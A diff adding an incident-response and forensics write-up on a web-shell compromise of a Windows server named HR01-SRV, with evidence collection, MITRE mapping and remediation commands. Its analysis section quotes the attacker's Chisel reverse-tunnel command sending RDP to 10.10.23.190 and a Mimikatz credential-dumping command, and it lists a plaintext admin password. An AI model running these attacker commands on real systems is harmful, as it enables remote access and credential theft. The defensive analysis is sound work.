@@ -1,0 +1,96 @@
+# Incident Overview
+  Target: HR01-SRV (Windows Server)
+  Initial Vector: Web shell upload via Apache (/uploads/search.php)
+  Attacker IP: 10.10.23.190
+  Credentials Used: HR01-SRV\Administrator (Password: Admin123)
+
+  Web Shell Path: C:\Apache24\htdocs\uploads\search.php
+  Malicious Task: Apache Proxy (Runs at startup)
+  Tools Deployed:
+    httpd-proxy.exe (Chisel-based reverse proxy)
+    mimi.exe (Mimikatz variant)
+
+# Evidence Collection
+  Log Type	              Path	                                                                      Key Event IDs
+Apache                   Access	C:\Apache24\logs\access.log	                                          HTTP POST to /uploads/search.php
+PowerShell            	%AppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt	    Event ID 4104 (Script Block Logging)
+RDP Sessions	          Microsoft-Windows-TerminalServices-LocalSessionManager/Operational	          21 (Login), 24 (Logoff)
+Task Scheduler	        Microsoft-Windows-TaskScheduler/Operational                                   106 (Task Created)
+
+# Collect Apache logs
+  Get-Content C:\Apache24\logs\access.log | Select-String "10.10.23.190"
+
+# Dump PowerShell history
+  Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+# Export scheduled tasks
+  Get-ScheduledTask -TaskName "Apache Proxy" | Export-ScheduledTask -Path C:\Evidence\malicious_task.xml
+
+# MITRE ATT&CK Mapping
+Tactic	            Technique	                                        Evidence
+Initial Access	    Exploit Public-Facing Application (T1190)	        Apache access.log
+Execution	          PowerShell (T1059.001)	                          Event ID 4104
+Credential Access	  OS Credential Dumping (T1003)	                    mimi.exe process creation
+Persistence	        Scheduled Task (T1053.005)	                      Task XML file
+
+# Forensic Analysis
+  Web Shell
+    Path: C:\Apache24\htdocs\uploads\search.php
+    Detection: File modified timestamp, Base64-encoded PHP code
+  httpd-proxy.exe
+    Behavior: Reverse proxy tunneling RDP to attacker
+    Command:
+      C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389
+  Mimikatz Execution
+    Command: lsadump::lsa /inject (extracts hashes)
+    Defender Detection: HackTool:Win32/Mimikatz!pz
+
+# Remediation Guide
+  # Kill malicious process
+    Stop-Process -Name "httpd-proxy" -Force
+  # Disable task
+    Disable-ScheduledTask -TaskName "Apache Proxy"
+
+  Credential Rotation
+    Reset all passwords for:
+      Local admin accounts
+      Service accounts
+      Domain admins who logged into HR01-SRV
+
+  Network Isolation
+    Block 10.10.23.190 at firewall
+    Segment HR network from production
+
+Enable PowerShell Logging:
+
+# Script Block Logging
+  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+Harden Apache:
+  Disable write permissions to /uploads
+  Restrict access by IP
+
+# Tools & Scripts
+Tool	                Purpose	                  Command Example
+Volatility	          Memory analysis	          volatility -f mem.dump windows.pslist
+KAPE	                Evidence collection	      kape --tsource C --tdest E:\Evidence
+ChainSaw	            Log hunting	              chainsaw hunt -s rules/ -f Security.evtx
+
+# Custom PowerShell Scripts
+  # Detect suspicious scheduled tasks
+  Get-ScheduledTask | Where-Object { 
+    $_.Actions.Execute -match "temp|powershell" -or 
+    $_.Principal.UserId -eq "SYSTEM" 
+} | Format-Table TaskName, Actions
+
+# Windows Event IDs Cheat Sheet
+ID	            Source	            Meaning
+1102	          Security	          Log cleared
+4104	          PowerShell	        Script block execution
+4688	          Security	          New process created
+
+# Disable malicious task
+  Unregister-ScheduledTask -TaskName "Apache Proxy" -Confirm:$false
+
+# Block attacker IP
+  New-NetFirewallRule -DisplayName "Block Attacker" -Direction Outbound -RemoteAddress 10.10.23.190 -Action Block
+
